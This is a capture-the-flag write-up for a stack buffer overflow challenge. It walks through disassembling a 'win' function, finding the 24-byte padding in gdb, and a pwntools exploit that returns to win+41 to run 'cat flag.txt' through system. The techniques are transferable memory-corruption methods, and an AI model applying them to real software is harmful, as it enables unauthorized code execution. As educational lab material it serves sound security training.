# Writeup

## Static Analysis

Similarly to the previous challenge there is a `target` string:

```c
char target[] = "cat flag.txt";
```

The `vuln` function is also the same.

This time instead of having a `pointer` variable along with `increment`, `shift` and `win` functions, there is just a `win` function:

```c
void win(long a, long b, long c, long d, long e, long f) {
    system((char *)(a ^ b ^ c ^ d ^ e ^ f));
    return;
}
```

The function takes 6 arguments, XORs them together and gives that as an the argument to `system`. We can therefore deduce that we need to somehow set these arguments so that when XORed they point to `target`.

Unlike `x86-32`, `x86-64` takes the first 6 arguments from registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9`) rather than from the stack. This makes passing these arguments rather difficult. If there were a larger codebase it may be possible to use ROP gadgets to set these registers prior to calling `win` but in our case such gadgets don't exist.

Let's look deeper into the assembly code that is produced for the `win` function. This can be done with `disass win` (short for `disassemble win`):

```assembly
   0x0000000000401152 <+0>:     push   rbp
   0x0000000000401153 <+1>:     mov    rbp,rsp
   0x0000000000401156 <+4>:     and    rsp,0xfffffffffffffff0
   0x000000000040115a <+8>:     sub    rsp,0x30
   0x000000000040115e <+12>:    mov    QWORD PTR [rsp+0x28],rdi
   0x0000000000401163 <+17>:    mov    QWORD PTR [rsp+0x20],rsi
   0x0000000000401168 <+22>:    mov    QWORD PTR [rsp+0x18],rdx
   0x000000000040116d <+27>:    mov    QWORD PTR [rsp+0x10],rcx
   0x0000000000401172 <+32>:    mov    QWORD PTR [rsp+0x8],r8
   0x0000000000401177 <+37>:    mov    QWORD PTR [rsp],r9
   0x000000000040117b <+41>:    mov    rax,QWORD PTR [rsp+0x28]
   0x0000000000401180 <+46>:    xor    rax,QWORD PTR [rsp+0x20]
   0x0000000000401185 <+51>:    xor    rax,QWORD PTR [rsp+0x18]
   0x000000000040118a <+56>:    xor    rax,QWORD PTR [rsp+0x10]
   0x000000000040118f <+61>:    xor    rax,QWORD PTR [rsp+0x8]
   0x0000000000401194 <+66>:    xor    rax,QWORD PTR [rsp]
   0x0000000000401198 <+70>:    mov    rdi,rax
   0x000000000040119b <+73>:    call   0x401030 <system@plt>
   0x00000000004011a0 <+78>:    nop
   0x00000000004011a1 <+79>:    leave  
   0x00000000004011a2 <+80>:    ret
```

We can see that after the function prologue the arguments are moved to the stack, XORed and then used to call `system`. What if  instead of returning to the start of the function we returned to `win+41`? At this point the program expects all the arguments to be on the stack which we can control using our buffer overflow.

## Dynamic Analysis

We have already devised a plan so all we need is the padding length:

```
gdb ./vuln
r
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
```

The program tries to return to `0x6665646362615a59` (`YZabcdef`) so we need 24 bytes of padding.

## Exploit

We will again use Pwntools to develop our exploit:

```
pwn template vuln --host 127.0.0.1 --port 42005 --quiet > exploit.py
```

The actual exploit code is very simple. We just send the padding, return address (`win+41`) and 6 numbers that when XORed together point to `target` (the address of `target` and 5 zeros will do fine):

```python
io.sendlineafter("Enter your name: ", flat({
    24: [exe.sym.win + 41, exe.sym.target] + [0] * 5 
}))
```

The full exploit code can be found in `exploit.py`.

